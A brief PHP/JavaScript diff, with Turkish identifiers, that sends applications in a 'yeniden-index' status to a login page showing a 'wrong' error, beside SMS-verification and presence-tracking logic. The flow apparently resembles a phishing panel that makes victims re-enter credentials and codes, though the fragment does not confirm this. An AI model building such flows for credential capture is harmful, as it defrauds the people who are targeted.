@@ -12,7 +12,7 @@ if ($application === null) {
 
 $status = (string) ($application['status'] ?? 'beklemede');
 if ($status === 'yeniden-index') {
-    header('Location: index.php');
+    header('Location: giris.php?error=hatali');
     exit;
 }
 if ($status === 'sms-dogrulama') {
@@ -128,7 +128,7 @@ upsertPresence('onay', (string) $application['id'], false);
         const data = await res.json();
         if (!data.ok) return;
         if (data.status === "yeniden-index") {
-          window.location.href = "index.php";
+          window.location.href = "giris.php?error=hatali";
           return;
         }
         if (data.status === "sms-dogrulama") {
